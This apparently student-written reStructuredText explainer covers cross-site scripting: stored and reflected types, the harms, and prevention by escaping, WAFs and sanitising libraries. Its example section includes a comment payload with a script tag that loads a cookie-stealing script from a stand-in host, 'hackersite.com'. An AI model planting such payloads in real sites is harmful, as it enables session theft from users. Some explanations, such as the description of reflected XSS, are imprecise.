Cross-Site Scripting
====================

Introduction
------------


Cross-site scripting is when an attacker inserts code into a legitimate website, 
and is considered one of the biggest website vulnerabilities. Web sites are 
especially vulnerable  when they don't use validation or encoding on user generated 
data. [xss]_

Cross-Site Scripting 


What is Cross-site scripting and Why is it Dangerous?
-----------------------------------------------------


* XSS, or Cross-Site Scripting is inserting malicious code into an actual website 
to gather information from the users. 

* Most danger lies on the users of the sites, as the code targets their information 
and use rather than the website itself. [xss]_ 

* Some examples of what dangerous XSS could do include: 
	1. Access session cookies, which can be used to impersonate the user
	2. Keylogging, which tracks the users keystrokes to catch usernames and passwords
	3. Phishing, or sending out fake and/or malicious emails
	4. Installing malicious software or viruses on the user's computer
	5. and Identity Theft [xss]_
	
* There are two different types of XSS attacks, stored and reflective

* Stored xss is "stored", or imbeded, on the website itself and steals data everytime 
the website is visited. [xss-prevention]_ It is also know as "persistant XSS", 
and can be the more dangerous of the two types. [xss-attacks]_

* Reflective xss is stored in a link embedded in the website that the user has to 
click on to activate. [xss-attacks]_ 


What Can Be Done to Prevent XSS through Web Security
----------------------------------------------------
	
* Web Application Firewall(WAF) - most common protection [xss-attacks]_ 
	
* Signiture based Filtering - "identifies and blocks malicious requests" [xss-attacks]_ 
	
* Use escape characters -  escape any characters that could change the websites 
code [xss-prevention]_ 
		
	* PHP Applications can use **htmlentities()** , a built in function for 
	escaping characters 
	
	* Also escape any HTML, attribute, JavaScript, JSON (with HTML), CSS, and URL 
	before entering any untrusted or unvalidated data [xss_cheat_sheet]_
		
* Escape data output, not input - when displaying to user [xss-prevention]_ 

	* "Security researcher Jouko Pynnönen of Klikki Oy realized MySQL column 
	truncation can defeat before-insert XSS prevention strategies" [xss-prevention]_

* Avoid using straight HTML - use a markup language, such as Markdown or 
ReStructuredText

* If HTML is needed, such as on blogging site, use a library such as HTML Purifier 
to help validate the HTML [xss-prevention]_ 


What You Can Do To Spot/Prevent XSS
---------------------------

* Be careful of links that you click on in websites and through emails. 

* Make sure that websites that you are visiting are safe

* Have a good Anti-Virus/ Web Security, such as McAfee AntiVirus Plus, Bitdefender 
AnitVirus Plus, or Kaspersky Anti-Virus

Example of Cross-Site Scripting:
-------------------------------

.. figure:: sorted-XSS.png

	Stored XSS [xss-attacks]_ 

	
* Stored XSS Example: An attacker figures out that the comment section of a website can store 
HTML tags. They leave a comment that says: 
"Great price for a great item! Read my review here <script src="http://hackersite.com/authstealer.js"> </script>" [xss-attacks]_
This is a stored in the website, and everytime someone visits the page, they have their 
session cookies stolen
	
	* Harder for hackers to attempt, because they must find a highly trafficed site that 
	also has a security hole. [xss-prevention]_

* Reflective XSS: Similar to above, but the user would have to click on the link 
to activate the code. 


Sources
-------

.. [xss] "`What is Cross-Site Scripting and How Can You Fix it? <https://www.acunetix.com/websitesecurity/cross-site-scripting/>`_." Acunetix. N.p. n.d. Web. 16 Feb. 2017. 

.. [xss-attacks] "`Cross Site Scripting (XSS) Attacks <https://www.incapsula.com/web-application-security/cross-site-scripting-xss-attacks.html>`_." Incapsula.com. N.p., n.d. Web. 18 Feb. 2017.

.. [xss-prevention] "`Everything You Need to Know About Preventing Cross-Site Scripting Vulnerabilities in PHP - Paragon Initiative Enterprises Blog <https://paragonie.com/blog/2015/06/preventing-xss-vulnerabilities-in-php-everything-you-need-know>`_." RSS. Paragon Initiative Enterprises , 16 June 2015. Web. 19 Feb. 2017. 

.. [xss_cheat_sheet] "`XSS (Cross Site Scripting) Prevention Cheat Sheet <https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet>`_." XSS (Cross Site Scripting) Prevention Cheat Sheet - OWASP. N.p., n.d. Web. 19 Feb. 2017.

*Written by Kyann, Edited by Rasim and Cole.*

